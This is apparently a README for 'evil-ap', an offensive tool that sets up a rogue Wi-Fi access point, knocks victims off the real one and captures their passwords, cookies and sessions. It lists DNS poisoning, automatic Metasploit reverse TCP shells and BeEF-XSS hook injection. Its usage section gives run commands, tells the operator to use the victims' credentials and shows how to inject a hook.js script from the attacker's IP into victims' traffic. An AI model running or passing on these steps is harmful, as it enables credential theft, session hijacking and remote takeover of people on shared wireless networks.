# What does it do:

#### Fast AP(AccessPoint) Setup
        *Semi-auto establishing a AP in 15 seconds 
        *Attack real AP and have victims connected to your fake AP
        *Auto-configuration on IPTABLES

#### Phishing
        *HTTP traffic filtering
        *Monitoring on AP network traffic 
        *Filtering Images and Passwords of victims 
        *Save Cookies&Sessions of victims 
        *Poisoning DNS
        *Providing Interface for cookie-spoofing Web Access (Ferret-NG)
        *Auto Metasploiting Reverse_TCP_Shell
        *Beef-XSS injectable

### USE AT YOUR OWN RISK AND RESPONSIBILITY


# Usages

Configure MITMf.conf ( especially about the ip address )
Configure MSF.rc First (unless you dont use msf/--filepwn)

### sample
#### 1
```
./evil-ap --client
driftnet -i eth0
```
#### 2
dont forget the section of Ferret-NG in MIRMf.conf , where 'Client' need to be configured specifically.
```
./evil-ap --ap
```
Proxy your browser via :10010 and use the victim's credentials.

#### 3
```
./beef-xss
./evil-ap --ap
```
and add ` --filepwn --inject --js-url http://yourip:3000/hook.js` to when required --EXTRAARGU

Use with your imagination.

# Install Help

### Requirment:
Tested Environment: Kali 2.0 (Kali Sana) 

Additional packaged needed(apt-get install):
        figlet
        isc-dhcp-server

To run MITMf on Kali , you need `python virtual environment` and `python virtualenvwrapper` 
then create an virtual env for MITMf , and install all the modules for MITMf in virtual env (see requirments.txt)
You will have many problems when install modules. Some modules wont compile at this time so just install as many modules as you can until you dont see problems while running `mitmf -l 10000 --ferretng --dns --hsts --port 10010`
Dont forget to add this to ~/.bashrc
```
export WORKON_HOME=/opt/VirtualEnvs
source /usr/local/bin/virtualenvwrapper.sh
```
Move the MITMf folder  to /opt `mv resources/MITMf  /opt/` and create an shortcut as `/usr/sbin/mitmf`
```
#!/bin/bash
cd /opt/MITMf

export WORKON_HOME=/opt/VirtualEnvs
source /usr/local/bin/virtualenvwrapper.sh 2>/dev/null

workon MITMf 2>/dev/null
python mitmf.py $@
```
`chmod +x /usr/sbin/mitmf`



